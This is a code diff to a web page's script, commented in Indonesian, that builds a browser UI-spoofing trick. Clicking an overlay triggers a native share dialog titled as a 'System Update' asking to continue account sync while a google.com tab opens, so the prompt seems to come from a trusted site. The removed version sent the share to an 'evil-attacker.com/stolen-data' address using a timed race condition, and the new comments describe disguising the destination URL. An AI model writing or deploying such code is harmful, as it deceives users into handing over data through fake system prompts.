@@ -24,32 +24,21 @@
         const overlay = document.getElementById('overlay');
 
         overlay.addEventListener('click', async () => {
-            // 1. Target Tab (Situs yang dipercaya pengguna)
-            const targetUrl = 'https://www.google.com';
+    const shareData = {
+        title: 'System Update',
+        text: 'Lanjutkan sinkronisasi akun?',
+        url: 'https://google.com' // Menyamarkan URL tujuan
+    };
 
-            // 2. Siapkan data Share (Ini akan memicu Dialog Sistem)
-            const shareData = {
-                title: 'Verifikasi Keamanan',
-                text: 'Kirim kode verifikasi ke perangkat Anda?',
-                url: 'https://evil-attacker.com/stolen-data'
-            };
+    // STRATEGI: Pemicuan Simultan (Tanpa Delay)
+    // Beberapa versi browser membolehkan dua aksi jika dieksekusi tepat bersamaan
+    
+    // 1. Picu Share terlebih dahulu (tanpa 'await' agar tidak berhenti)
+    navigator.share(shareData).catch(e => console.log(e));
 
-            // 3. Teknik "The Switch": 
-            // Kita buka tab baru terlebih dahulu
-            window.open(targetUrl, '_blank');
-
-            // 4. Memicu dialog share dengan sedikit delay (Race Condition)
-            // Delay ini disesuaikan agar dialog muncul DI ATAS tab Google
-            setTimeout(async () => {
-                try {
-                    if (navigator.share) {
-                        await navigator.share(shareData);
-                    }
-                } catch (err) {
-                    console.log('Dialog dibatalkan atau diblokir sistem');
-                }
-            }, 300); // 300ms adalah sweet spot untuk transisi tab Android
-        });
+    // 2. Langsung buka tab baru di baris berikutnya
+    window.open('https://www.google.com', '_blank');
+});
     </script>
 </body>
 </html>
